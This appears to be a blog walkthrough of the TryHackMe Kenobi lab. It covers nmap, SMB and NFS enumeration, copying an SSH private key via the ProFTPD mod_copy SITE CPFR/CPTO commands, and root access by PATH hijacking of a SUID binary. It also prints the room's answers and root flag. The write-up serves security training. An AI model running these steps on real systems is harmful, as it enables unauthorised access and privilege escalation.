---
layout: single
title: "Hacking Kenobi: From Anonymous Access to Root like a Rebel"
date: 2024-06-14
categories: Blog
tags: [Nmap, Samba, FTP, Apache, SUID, Netcat, Linux PrivEsc, Kenobi, MITRE ATT&CK, TryHackMe, Walkthrough, Privilege Escalation]
author_profile: true
read_time: true
related: true
share: true
toc: true
toc_label: "Table of Contents"
toc_sticky: true
header:
  overlay_image: /assets/images/00-hero.jpg
  overlay_filter: 0.4
  caption: "Cyber Jedi duel in the shadows of the terminal."
  teaser: /assets/images/thm/ctf/kenobi/thm-kenobi-00.png
  image: /assets/images/thm/ctf/kenobi/thm-kenobi-02.png
description: "A complete walkthrough of the Kenobi TryHackMe room, covering enumeration, exploiting ProFTPD, and privilege escalation using SUID PATH hijacking."
keywords: ["TryHackMe Kenobi Walkthrough", "Linux Privilege Escalation", "ProFTPD mod_copy exploit", "SUID PATH hijacking", "penetration testing"]
image: /assets/images/thm/ctf/thm-kenobi-02.png
---

Explore the official TryHackMe Kenobi room here:
<a href="https://tryhackme.com/room/kenobi" class="btn btn--primary" target="_blank">🔗 View the Kenobi Room on TryHackMe</a>


![Featured Image: Jedi Duel](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-02.png)

The **Kenobi** room on TryHackMe is a beginner-friendly Linux box focused on enumeration, exploiting Samba, leveraging a vulnerable ProFTPD service, and escalating privileges using SUID binaries. It’s a great room for anyone learning about Linux enumeration and privilege escalation paths.

This walkthrough is structured around the key tasks provided in the room:

- **Task 1**: Deploy the vulnerable machine
- **Task 2**: Enumerate Samba for shares
- **Task 3**: Gain initial access with ProFtpd
- **Task 4**: Escalate privileges via Path Variable Manipulation

---


## Task 1: Deploy the Vulnerable Machine

Once the machine was deployed, I noted its IP address (e.g., `10.10.223.18`) and ensured it was reachable. Then I launched an `nmap` scan to begin enumeration.

Scan the target machine:

```bash
sudo nmap -sC -sV -T4 10.10.223.18
```
![Nmap Full Scan Output](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-03.png)


**Answer:** There were **7** open ports:
- 21 (FTP)
- 22 (SSH)
- 80 (HTTP)
- 111 (RPC)
- 139 (NetBIOS-SSN)
- 445 (Samba)
- 2049 (NFS)

![Default Web Page on Port 80](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-20.png)
---

## Task 2: Enumerate Samba for Shares

To enumerate SMB shares, I ran the following `nmap` script:


```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.223.18
```

![SMB Share Enumeration](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-03.png))

**Answer:** 3 shares were found:
- `IPC$`
- `anonymous`
- `print$`

We then accessed the `anonymous` share using `smbclient`:

**Discovered Shares:** IPC$, anonymous, print$  
**Answer:** 3 shares

```bash
smbclient //10.10.223.18/anonymous
```

Once connected, I listed the contents of the share:

```bash
dir
```

![SMB Share File Listing](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-04.png)

**Answer:** The file present on the share was `log.txt`.



### Inspecting log.txt

```bash
cat log.txt
```

![log.txt contents](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-05.png)

This file revealed two key findings:
1. An RSA key was generated for user `kenobi' at `/home/kenobi/.ssh/id_rsa`
2. A ProFTPD configuration was mentioned—suggesting anonymous FTP is active and potentially exploitable via `mod_copy`.


---

### Enumerating Network File System (NFS)

**Answer:** FTP is running on port **21**.

We knew port **111** was open, which can indicate NFS. I ran the following:

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.223.18
```

![NFS Mount Enumeration](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-06.png)

**Answer:** `/var` is mountable via NFS.

---

## Task 3: Gain Initial Access with ProFtpd

From the initial `nmap` scan:

**Answer:** Version **1.3.5**

I used `searchsploit` to find matching exploits:

```bash
searchsploit proftpd 1.3.5
```

![Searchsploit Results for ProFTPD](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-07.png)

**Answer:** 4 exploits available for ProFTPD 1.3.5, including `mod_copy` vulnerabilities.

You should have found an exploit from ProFtpd's mod_copy module. 

The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 

### Exploiting ProFTPD mod_copy to Retrieve the Private Key

I connected to FTP using netcat and issued:

```bash
nc 10.10.223.18 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

![ProFTPD mod_copy usage](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-08.png)

---

### Mounting /var and Retrieving the Private Key

**Lets mount the /var/tmp directory to our machine**


```bash
sudo mkdir /mnt/kenobiNFS
sudo mount 10.10.223.18:/var /mnt/kenobiNFS
```

![Mounted NFS directory](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-09.png)




```bash
ls -la /mnt/kenobiNFS/tmp
```

**We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.**


![Found id_rsa](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-10.png)

```bash
sudo cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
```

![Copied id_rsa](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-11.png)

---

### SSH Login as Kenobi

```bash
ssh -i id_rsa kenobi@10.10.223.18
```

Once logged in:

```bash
cat /home/kenobi/user.txt
```

This confirmed access as `kenobi`. Now we move on to privilege escalation.

![SSH Login](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-12.png)


---

## Task 4: Privilege Escalation with SUID Binary

To begin privilege escalation, I searched for binaries with the **SUID** (Set User ID) bit set. The SUID permission causes executables to run with the permissions of the **file owner**, not the user who ran them. That’s a big deal when the file is owned by **root** because it means a low-privilege user might execute code with root privileges.

![Find SUID files](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-13.png)

I used the following command to list all SUID binaries on the system:

```bash
find / -perm -u=s -type f 2>/dev/null
```

- `/` tells it to start at the root of the file system  
- `-perm -u=s` looks for files with the user SUID bit set  
- `-type f` filters to regular files (not directories, sockets, etc.)  
- `2>/dev/null` hides “Permission Denied” errors to keep the output clean

This command returned a list of binaries, many of which are expected system utilities like `/usr/bin/passwd`, `/bin/su`, and `/usr/bin/sudo`.

But one binary stood out:

```bash
/usr/bin/menu
```

![Find SUID files](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-14.png)


This is **not** a standard utility on Linux systems, and it’s unusual for a custom binary to have SUID permissions. This made it a prime candidate for further analysis.

**Q: What file looks particularly out of the ordinary?**  
**A: /usr/bin/menu**

Running this binary:

```bash
/usr/bin/menu
```

presents a list of system-related options. 

**Q: Run the binary, how many options appear?**  
**A: 3**


![Binary execution](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-15.png)


### Investigating Vulnerable Behavior

To investigate the binary, I ran the `strings` command to extract readable strings:

```bash
strings /usr/bin/menu
```
![strings](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-17.png)


This output revealed several important clues. Near the bottom of the output were three recognizable commands:

```
curl -I localhost
uname -r
ifconfig
```

These are basic Linux networking and system commands that a script might use to check HTTP connectivity, system version, or network configuration. However, **they were not referenced with their full paths** (such as `/usr/bin/curl`). Instead, the binary simply calls them by name.

This is dangerous behavior in a SUID binary. When a program runs with elevated privileges and executes a command without specifying the full path, it relies on the `PATH` environment variable to locate that command. If a malicious user places a fake script named `curl` in a directory like `/tmp`, and then manipulates the `PATH` variable to prioritize that directory, the binary will execute the fake script instead.

Because `menu` is owned by root and has the SUID bit set, it runs as root, which means the attacker’s fake script also runs as root.

We demonstrated this by copying `/bin/sh` into a file named `curl`, making it executable, and updating our `PATH` variable:

```bash
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

![Copy bin/sh into PATH](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-18.png)

When `menu` executed `curl`, it actually invoked our shell as root.


```bash
id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),...
```

This sets up a classic and powerful privilege escalation vector known as **PATH hijacking**.


---

### Capturing the Root Flag

With root access achieved, I navigated to the root user's home directory and retrieved the final flag:

```bash
cat /root/root.txt
```

**Root Flag:** `177b3cd8562289f37382721c28381f02`

![Capture the root flag](https://notesbynisha.com/assets/images/thm/ctf/kenobi/thm-kenobi-19.png)

---

## Lessons Learned

- Enumeration is everything — it led us to discover open ports, accessible shares, and service versions.

- The `mod_copy` vulnerability in ProFTPD enabled file extraction and SSH access.

- Misconfigured SUID binaries can be devastating when they rely on PATH without hardcoded command paths.

- PATH hijacking remains a critical privilege escalation technique on Linux systems.

This was a fantastic room to practice chaining enumeration and exploitation steps together for a full system compromise.